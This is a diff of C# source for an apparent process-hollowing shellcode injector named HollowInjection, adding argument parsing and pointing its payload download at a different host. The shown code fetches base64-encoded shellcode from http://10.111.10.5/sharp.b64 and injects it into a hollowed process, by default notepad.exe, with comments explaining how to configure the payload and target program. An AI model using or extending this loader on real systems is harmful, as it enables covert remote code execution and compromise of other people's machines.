@@ -368,7 +368,6 @@ namespace HollowInjection
         }
 
 
-
         public static void Main(string[] args)
         {
             try
@@ -390,11 +389,22 @@ namespace HollowInjection
                     return;
                 }
 
+                //Any given arguments are added to the dictionary
+                var arguments = new Dictionary<string, string>();
+                foreach (var argument in args)
+                {
+                    var idx = argument.IndexOf(':');
+                    if (idx > 0)
+                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
+                    else
+                        arguments[argument] = string.Empty;
+                }
+
                 // STEP 1: PAYLOAD
                 // Add a base64 encoded shellcode string were the placeholder is
                 // OR hardcode the URL to remotely download the base64 encoded shellcode in memory
-                string shellcode = "<PLACEHOLDER>";
-                string urlToSC = @"http://192.168.1.10/payload.b64";
+                string shellcode = "";
+                string urlToSC = @"http://10.111.10.5/sharp.b64";
 
                 shellcode = GetCode(urlToSC); //if NOT downloading the shellcode, command this line out. 
 
@@ -405,9 +415,9 @@ namespace HollowInjection
                 // Hardcode the path to the program that is started and used to inject the shellcode into
                 // OR specify the path as an argument during execution: /program:C:\<path to program.exe>
                 string pathToService = @"C:\Windows\System32\notepad.exe";
-                if (args.Length != 0)
+                if (arguments.ContainsKey("/program"))
                 {
-                    pathToService = args[0].Remove(0, 9);
+                    pathToService = arguments["/program"];
                 }
 
                 ProcessHollow ProcessHollow = new ProcessHollow();
